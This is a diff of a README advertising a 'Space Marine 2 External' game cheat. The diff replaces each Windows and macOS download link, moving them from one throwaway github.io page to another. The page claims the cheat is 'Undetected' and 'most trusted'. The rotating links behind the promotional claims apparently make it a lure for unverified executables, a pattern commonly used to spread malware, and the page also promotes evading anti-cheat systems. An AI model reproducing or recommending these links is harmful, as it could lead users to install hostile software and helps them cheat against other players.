@@ -1,9 +1,9 @@
 # 🎮 Space Marine 2 External — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://hornbladesmanhonor.github.io/download-win/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://hornbladesmanhonor.github.io/download-mac/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://phantommofence.github.io/download-win/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://phantommofence.github.io/download-mac/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://phantommofence.github.io/download-win/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://phantommofence.github.io/download-win/)
 
 > The most trusted **Space Marine 2 External** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
 
@@ -82,11 +82,11 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://hornbladesmanhonor.github.io/download-win/">
+  <a href="https://phantommofence.github.io/download-win/">
     <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
   </a>
   &nbsp;&nbsp;
-  <a href="https://hornbladesmanhonor.github.io/download-mac/">
+  <a href="https://phantommofence.github.io/download-mac/">
     <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
   </a>
 </p>
